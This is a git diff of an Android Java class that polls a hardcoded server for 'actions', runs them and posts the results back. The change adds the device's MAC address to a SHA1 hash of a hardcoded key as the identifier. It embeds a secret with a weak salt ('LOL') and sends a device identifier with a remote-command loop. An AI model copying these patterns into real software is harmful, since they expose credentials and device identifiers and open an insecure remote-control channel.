@@ -23,6 +23,7 @@ public class ConnectionServerThread implements Runnable {
     private String SALT = "LOL";
     private String KEY = null;
     private String HASH = null;
+    private String MAC = null;
     private boolean cancel = false;
     private IHttpURLConnection httpURLConnection;
 
@@ -37,16 +38,15 @@ public class ConnectionServerThread implements Runnable {
         this.context = context;
         this.httpURLConnection = new HttpsURLConnectionHelper();
         this.KEY = SALT + "8df639b301a1e10c36cc2f03bbdf8863";
-        //this.host = "pi.remijouannet.com";
         this.host = "192.168.1.36";
-        //this.port = "443";
         this.port = "8080";
         this.timeon = 4000;
         this.timeoff = 54000;
         this.time = timeon;
-
         actionService = new ActionService(context);
         this.HASH = Tools.SHA1(this.KEY);
+        this.MAC = Tools.getMacAddress(this.context);
+
         try {
             this.urlaction = new URL("https://"+ host +":"+port+"/action");
             this.urlresult = new URL("https://"+ host +":"+port+"/result");
@@ -74,7 +74,7 @@ public class ConnectionServerThread implements Runnable {
               if (detla > time) {
                    result = this.httpURLConnection.getHttp(urlaction);
                    if (result != null && !result.equals("null")) {
-                       this.httpURLConnection.postHttp(urlresult, actionService.action(result), this.HASH);
+                       this.httpURLConnection.postHttp(urlresult, actionService.action(result), this.MAC + "::::" +this.HASH);
                        detla = 0;
                    }
               }
